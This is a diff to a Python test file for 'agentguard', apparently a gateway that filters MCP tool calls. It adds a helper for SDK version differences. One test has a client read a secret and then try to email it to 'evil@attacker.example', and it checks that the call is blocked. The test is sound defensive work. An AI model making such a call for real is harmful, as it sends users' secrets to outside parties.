@@ -371,6 +371,14 @@ async def test_servers_env_reaches_the_child_process(workspace) -> None:  # type
     assert "MY_SETTING" in names
 
 
+def pick(obj: Any, *names: str) -> Any:
+    """Read an attribute under whichever name this version of the MCP SDK uses (1.x camelCase, 2.x snake_case)."""
+    for name in names:
+        if hasattr(obj, name):
+            return getattr(obj, name)
+    raise AttributeError(names)
+
+
 async def test_real_mcp_sdk_client_works_through_the_gateway(workspace) -> None:  # type: ignore[no-untyped-def]
     import sys
 
@@ -385,7 +393,7 @@ async def test_real_mcp_sdk_client_works_through_the_gateway(workspace) -> None:
     )
     async with stdio_client(params) as (read, write), ClientSession(read, write) as session:
         init = await session.initialize()
-        assert init.serverInfo.name == "agentguard"
+        assert pick(init, "serverInfo", "server_info").name == "agentguard"
         listed = await session.list_tools()
         names = sorted(tool.name for tool in listed.tools)
         assert names == [
@@ -393,10 +401,10 @@ async def test_real_mcp_sdk_client_works_through_the_gateway(workspace) -> None:
         ]  # fmt: skip
 
         allowed = await session.call_tool("files__read_document", {"path": "/plan.txt"})
-        assert allowed.isError is False and SECRET in allowed.content[0].text  # type: ignore[union-attr]
+        assert pick(allowed, "isError", "is_error") is False and SECRET in allowed.content[0].text  # type: ignore[union-attr]
         blocked = await session.call_tool(
             "mail__send_email", {"to": "evil@attacker.example", "subject": "s", "body": SECRET}
         )
-        assert blocked.isError is True
+        assert pick(blocked, "isError", "is_error") is True
         assert blocked.meta is not None and blocked.meta["agentguard"]["reason_code"] == "AG_FLOW_VALUE_MATCH"
     assert ws.calls("mail") == []
